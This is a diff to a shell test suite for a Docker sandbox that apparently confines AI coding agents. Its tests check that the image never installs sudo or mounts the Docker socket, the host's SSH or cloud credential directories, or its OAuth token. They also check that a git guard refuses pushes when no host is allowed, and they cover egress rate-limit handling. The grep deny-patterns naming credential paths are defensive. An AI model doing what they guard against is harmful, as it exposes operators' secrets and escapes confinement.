@@ -8,6 +8,11 @@ setup() {
     SANDBOX_DIR="$BATS_TEST_DIRNAME/../docker"
     REPO_ROOT="$BATS_TEST_DIRNAME/.."
     LIB="$REPO_ROOT/bin/dejima-provider-lib.sh"
+    # The guards and their hooks source the shared policy from the path the
+    # Dockerfile installs it at, which is not where the checkout holds it. The
+    # test below named for the COPY line is what keeps the image path honest,
+    # since nothing here would notice it stopped being copied.
+    export DEJIMA_GUARD_LIB="$SANDBOX_DIR/guard-lib.sh"
 }
 
 # Runs one function from the provider library in a subshell, the same way
@@ -27,12 +32,12 @@ flat_prose() { tr '\n' ' ' < "$1" | tr -d '*`' | tr -s ' '; }
 
 @test "Dockerfile never installs sudo" {
     run grep -E '^\s*sudo\s*\\?\s*$' "$SANDBOX_DIR/Dockerfile"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "Dockerfile never creates a sudoers entry" {
     run grep -i "sudoers" "$SANDBOX_DIR/Dockerfile"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "Dockerfile creates a SANDBOX_USER matching the host user, not a hardcoded node" {
@@ -46,13 +51,13 @@ flat_prose() { tr '\n' ' ' < "$1" | tr -d '*`' | tr -s ' '; }
     # No literal "USER node" anywhere - the mid-build USER switch must use
     # the parametrized variable, not the old hardcoded name.
     run grep -E '^USER\s+node\s*$' "$SANDBOX_DIR/Dockerfile"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     grep -qE '^USER\s+\$SANDBOX_USER\s*$' "$SANDBOX_DIR/Dockerfile"
 }
 
 @test "entrypoint.sh drops privilege via SANDBOX_USER, not a literal node" {
     run grep -E 'gosu "?node\b|--user="?node\b' "$SANDBOX_DIR/entrypoint.sh"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     # Both spellings, because the session's own drop is not the gosu one: it
     # goes through capsh, which reduces the bounding set in the same process
     # that changes uid. A check that only knew about gosu would keep passing
@@ -260,8 +265,9 @@ EOF
 # cannot be sourced - it would try to change the packet filter - so the function
 # is extracted and run against a stubbed curl. No container, no network.
 #
-# `sleep` is shadowed by a no-op: the retry delays are deliberate in production
-# and pure cost here.
+# `sleep` is shadowed: the retry delays are deliberate in production and pure
+# cost here, and what they would have been is the subject of some of the tests
+# below - so it reports rather than simply returning.
 run_fetch() {
     local behaviour="$1"
     STUB_DIR="$BATS_TEST_TMPDIR/stub"
@@ -269,7 +275,7 @@ run_fetch() {
     cp "$behaviour" "$STUB_DIR/curl"
     chmod +x "$STUB_DIR/curl"
     PATH="$STUB_DIR:$PATH"
-    sleep() { :; }
+    sleep() { printf 'slept %s\n' "$1" >&2; }
     say() { printf '%s\n' "$*" >&2; }
     die() { printf 'FAILED: %s\n' "$*" >&2; exit 1; }
     FORGE_META_URL="https://forge.example/meta"
@@ -277,6 +283,8 @@ run_fetch() {
     FORGE_META_AUTH=""
     FETCH_ATTEMPTS=3
     FETCH_TIMEOUT=5
+    FETCH_MAX_BACKOFF=${FETCH_MAX_BACKOFF:-60}
+    eval "$(sed -n '/^retry_after_from()/,/^}/p' "$SANDBOX_DIR/egress-policy")"
     eval "$(sed -n '/^fetch_forge_ranges()/,/^}/p' "$SANDBOX_DIR/egress-policy")"
     fetch_forge_ranges "$BATS_TEST_TMPDIR/meta" && cat "$BATS_TEST_TMPDIR/meta"
 }
@@ -290,15 +298,21 @@ meta_json() {
 # Writes a body to wherever curl was told to --output, and prints the status
 # code curl's --write-out would have. Both are what the real fetch reads.
 stub_curl() {
-    local status_code="$1" body="$2" extra="${3:-}"
+    local status_code="$1" body="$2" extra="${3:-}" headers="${4:-}"
     cat > "$BATS_TEST_TMPDIR/stubsrc" <<EOF
 #!/bin/bash
 $extra
 out=""
+hdr=""
 while [ \$# -gt 0 ]; do
-    case "\$1" in --output) out="\$2"; shift 2 ;; *) shift ;; esac
+    case "\$1" in
+        --output) out="\$2"; shift 2 ;;
+        --dump-header) hdr="\$2"; shift 2 ;;
+        *) shift ;;
+    esac
 done
 printf '%s' '$body' > "\$out"
+[ -z "\$hdr" ] || printf '$headers' > "\$hdr"
 printf '%s' '$status_code'
 EOF
     printf '%s' "$BATS_TEST_TMPDIR/stubsrc"
@@ -374,6 +388,84 @@ EOF
     [[ "$output" == *"curl exit 7"* ]]
     [[ "$output" == *"$(meta_json)"* ]]
 }
+
+@test "the ranges fetch waits as long as a rate limit asks, and says which failure it is" {
+    # 403 with a Retry-After is how GitHub reports a secondary limit, and it
+    # clears on a scale of tens of seconds - against which attempt*2 spent
+    # twenty seconds over five tries and could sit inside one window and
+    # exhaust itself without ever reaching the other side (#357).
+    run run_fetch "$(stub_curl 403 '{"message":"API rate limit exceeded"}' '' \
+        'HTTP/2 403\r\nretry-after: 37\r\n\r\n')"
+    [ "$status" -ne 0 ]
+    # The endpoint's own number beats anything this would have guessed.
+    [[ "$output" == *"slept 37"* ]] \
+        || { echo "Retry-After was not honoured: $output"; return 1; }
+    [[ "$output" == *"Retry-After: 37s"* ]] \
+        || { echo "the wait was not reported with its source: $output"; return 1; }
+    # And the diagnosis names the code and what the API said, not just one.
+    [[ "$output" == *"http 403"* ]] || { echo "$output"; return 1; }
+    [[ "$output" == *"API rate limit exceeded"* ]] || { echo "$output"; return 1; }
+}
+
+@test "a rate limit with no Retry-After still gets a wait long enough to outlast one" {
+    run run_fetch "$(stub_curl 429 '{"message":"Too Many Requests"}')"
+    [ "$status" -ne 0 ]
+    # attempt*15 rather than attempt*2, so three attempts cover 45s instead of
+    # 6s. Asserted by value, since the point of the change is the magnitude.
+    [[ "$output" == *"slept 15"* ]] && [[ "$output" == *"slept 30"* ]] \
+        || { echo "a rate limit got the ordinary backoff: $output"; return 1; }
+}
+
+@test "a rate limit answered over a 200 is recognised from the body" {
+    # The endpoint will report one with a message and no ranges over a 200, so
+    # the status code alone does not decide it.
+    run run_fetch "$(stub_curl 200 '{"message":"You have exceeded a secondary rate limit"}')"
+    [ "$status" -ne 0 ]
+    [[ "$output" == *"slept 15"* ]] \
+        || { echo "a 200-wrapped rate limit got the ordinary backoff: $output"; return 1; }
+}
+
+@test "a failure that is not a rate limit keeps the short backoff" {
+    # The positive control for the two above: waiting a minute on a connection
+    # error would be a boot spending a minute on something no wait fixes.
+    cat > "$BATS_TEST_TMPDIR/refused" <<'EOF'
+#!/bin/bash
+echo "curl: (7) Failed to connect" >&2
+exit 7
+EOF
+    run run_fetch "$BATS_TEST_TMPDIR/refused"
+    [ "$status" -ne 0 ]
+    [[ "$output" == *"slept 2"* ]] \
+        || { echo "a connection failure did not get the short backoff: $output"; return 1; }
+    [[ "$output" != *"slept 15"* ]] \
+        || { echo "a connection failure was treated as a rate limit: $output"; return 1; }
+}
+
+@test "a Retry-After nobody expected cannot turn a boot into a hang" {
+    # Set here rather than as a command prefix: run_fetch is a shell function,
+    # and `env` cannot exec one.
+    FETCH_MAX_BACKOFF=30
+    run run_fetch "$(stub_curl 403 '{"message":"rate limit"}' '' \
+        'HTTP/2 403\r\nRetry-After: 86400\r\n\r\n')"
+    [ "$status" -ne 0 ]
+    [[ "$output" == *"slept 30"* ]] \
+        || { echo "the cap did not apply: $output"; return 1; }
+    [[ "$output" != *"slept 86400"* ]] || { echo "$output"; return 1; }
+}
+
+@test "a Retry-After that is an HTTP date is not read as a number of seconds" {
+    # The header may carry a date instead, and parsing one to compare against a
+    # clock is a wrong answer away from a sleep nobody chose - so only the
+    # numeric form is honoured and the rest falls back to the backoff.
+    run run_fetch "$(stub_curl 403 '{"message":"rate limit"}' '' \
+        'HTTP/2 403\r\nRetry-After: Wed, 21 Oct 2026 07:28:00 GMT\r\n\r\n')"
+    [ "$status" -ne 0 ]
+    [[ "$output" == *"slept 15"* ]] \
+        || { echo "a date was not ignored: $output"; return 1; }
+    [[ "$output" != *"Retry-After:"* ]] \
+        || { echo "a date was reported as a honoured wait: $output"; return 1; }
+}
+
 # The same harness for the other half: what happens to a permitted name that
 # does not come back the way the policy needs. Two outcomes have to stay
 # distinct, and conflating them is how a container either dies over nothing or
@@ -685,6 +777,41 @@ EOF
     [[ "$output" == *"carried no ranges"* ]]
 }
 
+@test "a file:// ranges source is a test fixture and refuses to be anything else" {
+    # The suite fetches GitHub's ranges once per run and points every container
+    # pair at the result, because twenty-seven filters each fetching for
+    # themselves is the burst that trips the endpoint's secondary limit (#357).
+    # Those ranges decide which addresses the forge class reaches, so a launch
+    # that could name its own source could name its own ranges.
+    printf '%s' '{"web":["192.0.2.0/24"],"api":["192.0.2.0/24"],"git":["192.0.2.0/24"]}' \
+        > "$BATS_TEST_TMPDIR/meta.json"
+    _file_fetch() {
+        run env ${1:+SANDBOX_TEST_MODE=1} bash -c '
+            set -u
+            say() { printf "say: %s\n" "$*" >&2; }
+            die() { printf "die: %s\n" "$*" >&2; exit 1; }
+            FORGE_META_URL="file://$2/meta.json"
+            FORGE_META_FILTER="[.git[]?, .api[]?, .web[]?] | unique | .[]"
+            FORGE_META_AUTH=""; FETCH_ATTEMPTS=1; FETCH_TIMEOUT=5; FETCH_MAX_BACKOFF=60
+            eval "$(sed -n "/^retry_after_from()/,/^}/p" "$1/egress-policy")"
+            eval "$(sed -n "/^fetch_forge_ranges()/,/^}/p" "$1/egress-policy")"
+            fetch_forge_ranges "$2/out.json"
+        ' _ "$SANDBOX_DIR" "$BATS_TEST_TMPDIR"
+    }
+
+    _file_fetch ""
+    [ "$status" -ne 0 ] || { echo "a file source was read outside a test container"; return 1; }
+    [[ "$output" == *"test fixture only"* ]] || { echo "$output"; return 1; }
+
+    # And it works where the suite uses it, or the fixture is no use: curl
+    # reports no status for a scheme that has none, so 200 cannot be what
+    # counts as a good transfer here.
+    _file_fetch 1
+    [ "$status" -eq 0 ] || { echo "the fixture path does not work: $output"; return 1; }
+    grep -q '192.0.2.0/24' "$BATS_TEST_TMPDIR/out.json" \
+        || { echo "the ranges did not land"; return 1; }
+}
+
 @test "the ranges fetch sends the launcher's credential when it has one" {
     # Unauthenticated, the default endpoint is rate-limited per source address
     # across everything on the host, so a host starting sandboxes in a loop
@@ -824,6 +951,61 @@ _runs_sweeper() {  # <a RUN line, with or without a "N:" prefix>
     return 1
 }
 
+@test "the git shadow is installed whatever the workflow says, because empty refuses" {
+    # DEJIMA_PUSH_HOSTS fails closed - empty means no host may be pushed to,
+    # which is how a non-pushing workflow becomes enforced rather than
+    # described. Installing the shadow only when it or the blocked-branch list
+    # was non-empty inverted that: absent in exactly the case it exists for.
+    #
+    # The shipped default workflow is local-only, which sets push off and no
+    # blocked branches, so that was the ordinary case - and a harness declaring
+    # no guards had nothing checking a push at all.
+    local ep="$SANDBOX_DIR/entrypoint.sh" line
+    line=$(grep -n 'ln -sf /usr/local/lib/dejima/git-guard.sh /usr/local/bin/git' "$ep") \
+        || { echo "the git shadow is not installed at all"; return 1; }
+
+    # Not gated, in any spelling. An `if` is one way to reintroduce this; so are
+    # `[ -n ... ] && ln`, `test -n ... && ln`, and an `if` whose body is not
+    # indented. Three checks rather than one pattern: the command sits at the
+    # top level of the file, carries no test of its own, and the block it lives
+    # in opens no conditional on either list.
+    local n before
+    n=${line%%:*}
+    [[ "${line#*:}" == "ln -sf"* ]] \
+        || { echo "the link is indented, so it sits inside something: $line"; return 1; }
+    grep -qE '(\[|test |&&|\|\|)' <<< "${line#*:}" \
+        && { echo "the link carries a condition of its own: $line"; return 1; }
+    before=$(sed -n "1,${n}p" "$ep" | tac | sed -n '/^fi$/q;p' | tac)
+    grep -qE '^[[:space:]]*(if|elif)[[:space:]].*(DEJIMA_PUSH_HOSTS|DEJIMA_BLOCKED_BRANCHES)' <<< "$before" \
+        && { echo "the shadow is gated on a list that may legitimately be empty:"; echo "$before"; return 1; }
+    true
+}
+
+@test "the git shadow refuses a push when no host is permitted" {
+    # The other half of the reason the shadow is unconditional: empty means
+    # refuse, so shipping it always is fail-closed rather than merely more code.
+    #
+    # Run against the real guard and a real repository, not a copy of its loop
+    # written here. A simulation passes while an early fail-open added above the
+    # loop ships, and fails when the loop is rewritten innocuously - it tests
+    # this file rather than that one.
+    local repo
+    repo="$(_guard_repo)"
+    run bash -c 'DEJIMA=1 DEJIMA_PUSH_HOSTS="" DEJIMA_BLOCKED_BRANCHES="" \
+        DEJIMA_FORGE_NAME=gitea bash "$1" -C "$2" push origin feature 2>&1 | head -1' \
+        _ "$SANDBOX_DIR/git-guard.sh" "$repo"
+    [[ "$output" == *"Blocked by dejima"* ]] \
+        || { echo "an empty host list permitted a push: $output"; return 1; }
+
+    # And with a host permitted, the same invocation is not refused for that
+    # reason - so the refusal above is the empty list and not a broken guard.
+    run bash -c 'DEJIMA=1 DEJIMA_PUSH_HOSTS="forge.invalid" DEJIMA_BLOCKED_BRANCHES="" \
+        DEJIMA_FORGE_NAME=gitea bash "$1" -C "$2" push origin feature 2>&1 | head -1' \
+        _ "$SANDBOX_DIR/git-guard.sh" "$repo"
+    [[ "$output" != *"may only push to"* ]] \
+        || { echo "a permitted host was refused as unpermitted: $output"; return 1; }
+}
+
 @test "the image sweeps its privilege bits last, and a derived layer sweeps again" {
     # The sweep only covers what exists when it runs, so the base image's copy
     # has to be the last thing that changes the filesystem, and the derived
@@ -873,7 +1055,7 @@ _runs_sweeper() {  # <a RUN line, with or without a "N:" prefix>
 
 @test "docker-compose.yml never mounts the Docker socket" {
     run grep -i "docker.sock" "$SANDBOX_DIR/docker-compose.yml"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "docker-compose.yml never mounts host SSH/cloud credential directories" {
@@ -882,7 +1064,7 @@ _runs_sweeper() {  # <a RUN line, with or without a "N:" prefix>
     # as a *destination* path now that it mirrors the host's $HOME, which
     # isn't the same thing as mounting the host's real ~/.ssh directory in.
     run grep -E '^\s*-\s*\$\{HOME\}/\.(ssh|aws|gcloud|azure)(/|:)' "$SANDBOX_DIR/docker-compose.yml"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "~/.claude is not mounted as a whole - its contents are enumerated" {
@@ -895,9 +1077,9 @@ _runs_sweeper() {  # <a RUN line, with or without a "N:" prefix>
     # handing the sandbox the operator's real OAuth token (#50). With no
     # parent mount, a detachment falls through to container-local emptiness.
     run grep -E '^\s*-\s*\$\{HOME\}/\.claude:\$\{HOME\}/\.claude\s*$' "$SANDBOX_DIR/docker-compose.yml"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     run grep -E '^\s*-\s*\$\{HOME\}/\.claude/\.credentials' "$SANDBOX_DIR/docker-compose.yml"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 # Whether the selected harness declares a directory its image layer creates.
@@ -1060,7 +1242,7 @@ _declared_config_dirs() {
 
 @test "docker-compose.yml never mounts the whole ~/.claude/projects tree" {
     run grep -nE '^\s*-\s*\$\{HOME\}/\.claude/projects:' "$SANDBOX_DIR/docker-compose.yml"
-    [ "$status" -ne 0 ] || {
+    [ "$status" -eq 1 ] || {
         echo "the projects tree is mounted whole again:" >&2
         echo "$output" >&2
         false
@@ -1094,7 +1276,7 @@ _declared_config_dirs() {
 # puts chosen content into a later restore there.
 @test "docker-compose.yml never mounts the whole ~/.claude/file-history tree" {
     run grep -nE '^\s*-\s*\$\{HOME\}/\.claude/file-history:' "$SANDBOX_DIR/docker-compose.yml"
-    [ "$status" -ne 0 ] || {
+    [ "$status" -eq 1 ] || {
         echo "the file-history tree is mounted whole again:" >&2
         echo "$output" >&2
         false
@@ -1121,7 +1303,7 @@ _declared_config_dirs() {
     grep -q 'dejima-slug-lib.sh"$' "$REPO_ROOT/bin/dejima-audit"
     # and neither keeps a private copy of the sed scheme
     run grep -n "s/\[^a-zA-Z0-9\]/-/g" "$REPO_ROOT/bin/dejima" "$REPO_ROOT/bin/dejima-audit"
-    [ "$status" -ne 0 ] || {
+    [ "$status" -eq 1 ] || {
         echo "an inline copy of the slug scheme is back:" >&2
         echo "$output" >&2
         false
@@ -1150,13 +1332,13 @@ _declared_config_dirs() {
     # And never mounted at their real paths, which is the property staging
     # exists for: a single-file mount detaches on a host-side rename.
     run grep -E '^\s*-\s*\$\{HOME\}/\.claude/(settings\.json|CLAUDE\.md|statusline\.sh):\$\{HOME\}/' "$SANDBOX_DIR/docker-compose.yml"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     # The staging tree mirrors the destination, so entrypoint.sh names no
     # harness's paths - it installs <rel> at $SANDBOX_HOME/<rel>.
     grep -q 'rel="${staged#/etc/dejima-harness/}"' "$SANDBOX_DIR/entrypoint.sh"
     grep -q 'dest="$SANDBOX_HOME/$rel"' "$SANDBOX_DIR/entrypoint.sh"
     run grep -n 'dejima-claude' "$SANDBOX_DIR/entrypoint.sh"
-    [ "$status" -ne 0 ] || { echo "entrypoint still names a harness path"; return 1; }
+    [ "$status" -eq 1 ] || { echo "entrypoint still names a harness path"; return 1; }
 }
 
 @test "~/.claude/hooks is mounted read-only" {
@@ -1366,7 +1548,7 @@ _declared_config_dirs() {
     # bin/dejima instead - see the next test. A hardcoded path here
     # would silently break for anyone whose hooks live somewhere else.
     run grep -i 'dotfiles' "$SANDBOX_DIR/docker-compose.yml"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "bin/dejima dynamically discovers and mounts hook-symlink targets" {
@@ -1467,7 +1649,13 @@ _cline_cfg() {
 
 # $1 is the config dir, $2 the workspace. Prints whatever the plugin said and
 # returns its status.
+#
+# The staging directory is $1/stage, because that is the second argument core
+# passes and because it is where the plugin writes this launch's provider
+# configuration now - it used to write into the state directory, which an
+# isolated launch does not mount. The tests below read it out of there.
 _cline_prepare() {
+    mkdir -p "$1/stage"
     DEJIMA_CONFIG_DIR="$1" bash -c '
         source "$2/bin/dejima-provider-lib.sh"
         source "$2/bin/dejima-project-lib.sh"
@@ -1475,7 +1663,7 @@ _cline_prepare() {
         source "$2/bin/dejima-slug-lib.sh"
         harness_plugin_load cline
         WORKSPACE_DIR="$1"
-        harness_prepare_config /dev/null' _ "$2" "$REPO_ROOT"
+        harness_prepare_config /dev/null "$3"' _ "$2" "$REPO_ROOT" "$1/stage"
 }
 
 @test "cline refuses to launch with no model configured" {
@@ -1513,7 +1701,7 @@ _cline_prepare() {
         # workspace slug, and spelling that out here would be a second copy of
         # ws_slug that could agree with nothing.
         local written
-        written="$(find "$d/state" -name providers.json -print -quit)"
+        written="$(find "$d/stage" -name providers.json -print -quit)"
         [ -n "$written" ] || { echo "no providers.json written for $id"; return 1; }
         local wrote
         wrote="$(jq -r '.providers."openai-compatible".settings.model' "$written")"
@@ -1637,7 +1825,7 @@ _cline_prepare() {
     run _cline_prepare "$cfg" "$ws"
     [ "$status" -eq 0 ] || { echo "$output"; return 1; }
     local f
-    f="$(find "$cfg/state" -name providers.json | head -1)"
+    f="$(find "$cfg/stage" -name providers.json | head -1)"
     [ -n "$f" ] || { echo "no providers.json was written"; return 1; }
     run jq -r '.providers.anthropic.settings.apiKey' "$f"
     [[ "$output" == *placeholder* ]] || { echo "the key is not a placeholder: $output"; return 1; }
@@ -1661,7 +1849,7 @@ _cline_prepare() {
     ws="$BATS_TEST_TMPDIR/ws-ts"
     run _cline_prepare "$cfg" "$ws"
     [ "$status" -eq 0 ] || { echo "$output"; return 1; }
-    f="$(find "$cfg/state" -name providers.json | head -1)"
+    f="$(find "$cfg/stage" -name providers.json | head -1)"
     [ -n "$f" ] || { echo "no providers.json"; return 1; }
     run jq -r '.providers.anthropic.updatedAt // "missing"' "$f"
     [ "$output" != "missing" ] || { echo "no updatedAt: cline will discard this"; return 1; }
@@ -1677,7 +1865,7 @@ _cline_prepare() {
     ws="$BATS_TEST_TMPDIR/ws-ts2"
     run _cline_prepare "$cfg" "$ws"
     [ "$status" -eq 0 ] || { echo "$output"; return 1; }
-    f="$(find "$cfg/state" -name providers.json | head -1)"
+    f="$(find "$cfg/stage" -name providers.json | head -1)"
     run jq -r '.providers."openai-compatible".updatedAt // "missing"' "$f"
     [ "$output" != "missing" ] || { echo "no updatedAt on the local branch"; return 1; }
 }
@@ -1695,13 +1883,13 @@ _cline_prepare() {
     cfg="$(_cline_cfg 'model = m' 'backend = anthropic' 'context_window = 15000')"
     run _cline_prepare "$cfg" "$BATS_TEST_TMPDIR/ws-cw"
     [ "$status" -eq 0 ] || { echo "$output"; return 1; }
-    f="$(find "$cfg/state" -name providers.json | head -1)"
+    f="$(find "$cfg/stage" -name providers.json | head -1)"
     run jq -r '.providers.anthropic.settings.contextWindow' "$f"
     [ "$output" = "15000" ] || { echo "not written as a number: $output"; return 1; }
 
     cfg="$(_cline_cfg 'model = m' 'backend = anthropic')"
     run _cline_prepare "$cfg" "$BATS_TEST_TMPDIR/ws-cw2"
-    f="$(find "$cfg/state" -name providers.json | head -1)"
+    f="$(find "$cfg/stage" -name providers.json | head -1)"
     run jq -r '.providers.anthropic.settings.contextWindow // "absent"' "$f"
     [ "$output" = "absent" ] || { echo "invented a context window: $output"; return 1; }
 }
@@ -1938,9 +2126,9 @@ _reference_has_key() {  # <doc> <section> <leaf>
     local conf="$REPO_ROOT/tools/rtk/tool.conf"
     [ -f "$conf" ] || { echo "the rtk manifest is gone"; return 1; }
     run grep -nE '^(hook|hooks|install_hook|init)' "$conf"
-    [ "$status" -ne 0 ] || { echo "rtk declares a hook:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "rtk declares a hook:"; echo "$output"; return 1; }
     run grep -rn 'rtk init\|rtk hook' "$REPO_ROOT/bin" "$REPO_ROOT/docker" "$REPO_ROOT/hooks"
-    [ "$status" -ne 0 ] \
+    [ "$status" -eq 1 ] \
         || { echo "something runs rtk's own installer:"; echo "$output"; return 1; }
 
     # And the guards are still registered the way they were - a tool layer
@@ -1975,7 +2163,7 @@ _reference_has_key() {  # <doc> <section> <leaf>
     grep -q 'approved_entries "$(config_root)" tools' "$REPO_ROOT/bin/dejima" \
         || { echo "the launcher no longer reads approved tools"; return 1; }
     run grep -n 'dejima/tools' "$REPO_ROOT/bin/dejima"
-    [ "$status" -ne 0 ] \
+    [ "$status" -eq 1 ] \
         || { echo "the launcher reads the declaration directly:"; echo "$output"; return 1; }
 }
 
@@ -2052,6 +2240,235 @@ _reference_has_key() {  # <doc> <section> <leaf>
         bash "$REPO_ROOT/test/shellcheck.sh" --list | grep -qx "$f" \
             || { echo "$f is not shellchecked"; return 1; }
     done
+}
+
+@test "a bounded wait is lengthened by what the run asked the machine for" {
+    # The suites wait on things that take as long as the machine makes them
+    # take, and each wait has a deadline. One that is right on an idle box is
+    # wrong under the gate, and raising it until both pass means picking a
+    # number that is wrong in one of them - which is how a fixture's idle bound
+    # went from sixty seconds to two hundred and forty (#295).
+    local ls="$REPO_ROOT/test/fixtures/loadscale.py"
+    [ -f "$ls" ] || { echo "the shared scale is gone"; return 1; }
+
+    # Both runners say what they asked for, or the multiplier is always 1 and
+    # this does nothing. Derived on each side from the concurrency it chose,
+    # not a constant either of them picked.
+    grep -qF 'export DEJIMA_TEST_CONCURRENCY=$(( ${#selected[@]} * jobs ))' \
+        "$REPO_ROOT/test/run-confined.sh" \
+        || { echo "the gate does not say how much concurrency it asked for"; return 1; }
+    grep -qF 'DEJIMA_TEST_CONCURRENCY=$(nproc) bats --jobs' \
+        "$REPO_ROOT/.gitea/workflows/tests.yml" \
+        || { echo "the CI job does not say how much concurrency it asked for"; return 1; }
+
+    # And every fixture that waits on one uses it, rather than carrying a bound
+    # chosen to survive the gate.
+    # The import, not the word: both files mention loadscale in a comment
+    # explaining why their bounds are what they are, so a grep for the name
+    # passes on a file that stopped using it.
+    local f
+    for f in tty-suspend-harness.py answer-prompt.py; do
+        grep -qE '^(import loadscale|from loadscale import)' "$REPO_ROOT/test/fixtures/$f" \
+            || { echo "$f has bounded waits that do not scale with the run"; return 1; }
+    done
+
+    # Driven, because the shape is easy to get right and the arithmetic is what
+    # matters. Never below 1, so an idle run and one with nothing set behave
+    # exactly as they do today; capped, because a wrong value here turns a test
+    # that should fail in seconds into one that hangs for the whole job.
+    local cores; cores="$(nproc)"
+    run env -u DEJIMA_TEST_CONCURRENCY python3 -c "
+import sys; sys.path.insert(0, '$REPO_ROOT/test/fixtures')
+import loadscale; print(loadscale.deadline(10.0))"
+    [ "$status" -eq 0 ] && [ "$output" = "10.0" ] \
+        || { echo "an unset variable changed a deadline: $output"; return 1; }
+
+    run env DEJIMA_TEST_CONCURRENCY=$(( cores * 2 )) python3 -c "
+import sys; sys.path.insert(0, '$REPO_ROOT/test/fixtures')
+import loadscale; print(loadscale.deadline(10.0))"
+    [ "$output" = "20.0" ] \
+        || { echo "twice the cores did not double a deadline: $output"; return 1; }
+
+    run env DEJIMA_TEST_CONCURRENCY=$(( cores / 2 )) python3 -c "
+import sys; sys.path.insert(0, '$REPO_ROOT/test/fixtures')
+import loadscale; print(loadscale.deadline(10.0))"
+    [ "$output" = "10.0" ] \
+        || { echo "an under-subscribed run shortened a deadline: $output"; return 1; }
+
+    local junk
+    for junk in 99999999 -5 "" notanumber; do
+        run env DEJIMA_TEST_CONCURRENCY="$junk" python3 -c "
+import sys; sys.path.insert(0, '$REPO_ROOT/test/fixtures')
+import loadscale; print(loadscale.scale())"
+        [ "$status" -eq 0 ] || { echo "'$junk' made the scale raise: $output"; return 1; }
+        awk -v s="$output" 'BEGIN { exit !(s >= 1.0 && s <= 4.0) }' \
+            || { echo "'$junk' produced a scale of $output"; return 1; }
+    done
+}
+
+@test "a changed path selects every suite that reads it, not just the one that owns it" {
+    # .dejima.md says nothing can tell that a rule is too narrow. A human
+    # cannot; this can. For each mapped path, every suite whose text names its
+    # basename has to appear in that rule's answer - and nearly none did:
+    # bin/dejima-provider-lib.sh selected only `providers` while config.bats
+    # sets LIB= to that very file, and bin/dejima-harness-lib.sh selected a
+    # suite that does not mention it at all.
+    #
+    # Over-selection is safe and under-selection is the bug: missing a suite
+    # reports an edit as green from a lane that never loaded it, while naming
+    # one too many costs a suite run. What counts as reading a file is defined
+    # below, and it is deliberately narrower than "mentions it".
+    local sf="$BATS_TEST_TMPDIR/suites_for.sh" path mapped refs r suite missing=() bad=()
+    sed -n '/^suites_for()/,/^}/p' "$REPO_ROOT/test/run-confined.sh" > "$sf"
+    [ -s "$sf" ] || { echo "could not extract suites_for"; return 1; }
+
+    # Comment lines excluded, because a suite that merely NAMES a file in prose
+    # does not read it - and suites cite each other in prose constantly, so
+    # counting those would push every rule towards ALL and leave the lane
+    # selecting everything. Over-selection is still the safe direction; this is
+    # about what "reads it" means, not about relaxing it.
+    #
+    # Stripped once per suite rather than once per path, because this walks the
+    # whole tree: inside the loop it would be one grep pass over every suite
+    # per tracked file, and .dejima.md warns what a slow test does to a bounded
+    # deadline under load.
+    mkdir -p "$BATS_TEST_TMPDIR/code"
+    for suite in "$REPO_ROOT"/test/*.bats; do
+        grep -v '^[[:space:]]*#' "$suite" > "$BATS_TEST_TMPDIR/code/$(basename "$suite" .bats)"
+    done
+
+    while IFS= read -r path; do
+        mapped="$(bash -c 'source "$1"; suites_for "$2"' _ "$sf" "$path" 2>/dev/null)"
+        [ "$mapped" = ALL ] && continue
+        missing=()
+        # The basename normally, because that is how a suite names a file -
+        # but the full path when the tree holds more than one file by that
+        # name, or web/README.md inherits every mention of the root one.
+        local needle="${path##*/}"
+        [ "$(cd "$REPO_ROOT" && git ls-files "*/$needle" "$needle" | wc -l)" -gt 1 ] \
+            && needle="$path"
+        refs="$(grep -ln -- "$needle" "$BATS_TEST_TMPDIR"/code/* 2>/dev/null \
+                | xargs -r -n1 basename | sort -u)"
+        for r in $refs; do
+            case "$r" in runtime|ci-runner) continue ;; esac
+            grep -qw "$r" <<< "$mapped" || missing+=("$r")
+        done
+        [ ${#missing[@]} -eq 0 ] || bad+=("$path -> [$mapped] misses: ${missing[*]}")
+    done < <(cd "$REPO_ROOT" && git ls-files)
+
+    [ ${#bad[@]} -eq 0 ] \
+        || { echo "these rules select fewer suites than read the file:"
+             printf '  %s\n' "${bad[@]}"; return 1; }
+}
+
+@test "the release pass names a manual check for the boundary itself" {
+    # Its patterns matched the launcher, the forges, the guards, the web page -
+    # and nothing in the egress policy, the capability floor or the credential
+    # path. So a release that rewrote the firewall was reported as touching
+    # nothing that needs a manual check, over exactly what this project exists
+    # to hold.
+    #
+    # Each path is tested against the script's own patterns rather than against
+    # a list copied here, so a pattern edited to no longer match is caught.
+    local rp="$SANDBOX_DIR/../test/release-pass.sh" pats p path unmatched=()
+    pats="$(grep -oE "^touches '[^']+'" "$rp" | sed "s/^touches '//; s/'$//")"
+    [ -n "$pats" ] || { echo "release-pass.sh declares no touches patterns"; return 1; }
+
+    for path in docker/egress-policy docker/firewall-up.sh docker/fixed-domains.sh \
+                docker/caps-lib.sh bin/dejima-credential-proxy \
+                docker/credential-proxy-forwarder.js backends/anthropic/backend.conf; do
+        local hit=0
+        while IFS= read -r p; do
+            grep -qE "$p" <<< "$path" && { hit=1; break; }
+        done <<< "$pats"
+        [ "$hit" = 1 ] || unmatched+=("$path")
+    done
+    [ ${#unmatched[@]} -eq 0 ] \
+        || { echo "no manual check is named for:"; printf '  %s\n' "${unmatched[@]}"; return 1; }
+}
+
+@test "every shell file in the tree is shellchecked, shebang or not" {
+    # The list is built by matching a shebang, with named exceptions for the
+    # sourced fragments that carry none. That exception list was a pattern
+    # rather than a roll of names precisely so nobody would have to remember to
+    # extend it - and it was still short by one: bin/*-lib.sh went unchecked,
+    # which is dejima-harness-lib.sh, the code deciding which host paths may be
+    # mounted where.
+    #
+    # Derived from the tree rather than from a list here, so the next fragment
+    # added in a new place fails this instead of being silently skipped.
+    local covered f first missing=()
